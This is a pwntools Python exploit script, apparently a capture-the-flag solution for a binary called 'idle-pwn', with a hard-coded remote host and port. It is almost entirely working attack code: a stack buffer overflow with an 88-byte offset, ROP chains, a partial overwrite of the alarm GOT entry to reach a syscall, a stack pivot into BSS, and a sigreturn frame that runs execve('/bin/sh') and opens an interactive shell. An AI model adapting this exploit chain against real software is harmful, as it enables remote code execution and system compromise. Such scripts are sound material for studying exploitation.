```py
from pwn import *

elf = context.binary = ELF('./idle-pwn')
# context.log_level = 'debug'
# break *0x4011e9

gdbscript = """
continue
"""
lambda sleep: None

for sys_offset in range(1):
    print(f"offset: {hex(sys_offset)}")
    if args.GDB:
        io = gdb.debug(elf.path, gdbscript=gdbscript, env={})
    elif args.REMOTE:
        io = remote('34.72.43.223', 49250)
    else:
        io = process(elf.path, env={})

    if args.GDB:
        sleep(2)
    
    offset = 88
    pop_rdi = 0x4011b5
    pop_rsi_r15 = 0x4011be
    ret = 0x401016
    leave_ret = 0x4011e8
    BSS = 0x404070

    # init
    rop = p64(elf.symbols['init'])
    rop += p64(elf.symbols['main'])

    payload = b'A' * offset + rop
    io.sendline(payload)
    sleep(1)
    # overwrite
    rop = p64(pop_rdi) 
    rop += p64(0)
    rop += p64(pop_rsi_r15) 
    rop += p64(elf.got['alarm'])
    rop += p64(0) 
    rop += p64(ret) + p64(elf.symbols['read']) 
    rop += p64(ret) + p64(elf.symbols['main'])

    payload = b'A' * offset + rop
    io.sendline(payload)
    sleep(1)

    # syscall = b"\x49"
    syscall = p8(0x7)
    # syscall = b"\x07" + p8(sys_offset)
    io.send(syscall)
    sleep(1)

    # write rop to bss
    rop = p64(pop_rdi) 
    rop += p64(0) 
    rop += p64(pop_rsi_r15) 
    rop += p64(BSS) 
    rop += p64(0) 
    rop += p64(elf.plt['read']) 
    rop += p64(elf.symbols['main'])

    payload = b'A' * offset + rop
    io.sendline(payload)
    sleep(1)

    # io.send(b"/bin/sh\x00" + p64(BSS + 16) + p64(0))
    io.send(b"\x00" * 40 + p64(elf.symbols['main']))
    sleep(1)

    nullptr = BSS + 16
    
    # write sigreturn frame to bss
    pos = BSS+0x68
    rop = p64(pop_rdi) 
    rop += p64(0)
    rop += p64(pop_rsi_r15) 
    rop += p64(pos)
    rop += p64(0) 
    rop += p64(elf.symbols['read']) # read into rax
    rop += p64(elf.symbols['main'])

    payload = b'A' * offset + rop
    io.sendline(payload)
    sleep(1)

    frame = SigreturnFrame()
    frame.rax = 59
    frame.rdi = pos+len(frame)
    frame.rsi = pos+len(frame) + 8
    frame.rdx = pos+len(frame) + 8
    frame.rip = elf.symbols['alarm']

    # io.send(bytes(frame))
    io.send(bytes(frame) + b"/bin/sh\x00" + p64(pos+len(frame)) + p64(0))
    print(f"binsh at {hex(pos+len(frame))}")
    sleep(1)

    # out = io.recvall(timeout=5)
    # print(out)

    # pivot
    payload = b'A' * (offset-8) + p64(BSS+0x20) + p64(leave_ret)
    io.sendline(payload)
    sleep(1)

    # call sigreturn
    rop = p64(pop_rdi) 
    rop += p64(0) 
    rop += p64(pop_rsi_r15) 
    rop += p64(BSS + 0x70 + len(frame) + 0x40)
    rop += p64(0) 
    rop += p64(elf.plt['read'])    
    rop += p64(elf.plt['alarm']) 
    
    payload = b'A' * offset + rop
    # input("calling sigreturn")
    io.sendline(payload)
    sleep(1)

    io.send(b"a" * 15)
    sleep(1)

    # assert b"fault" in out

    # io.close()
    io.interactive()
```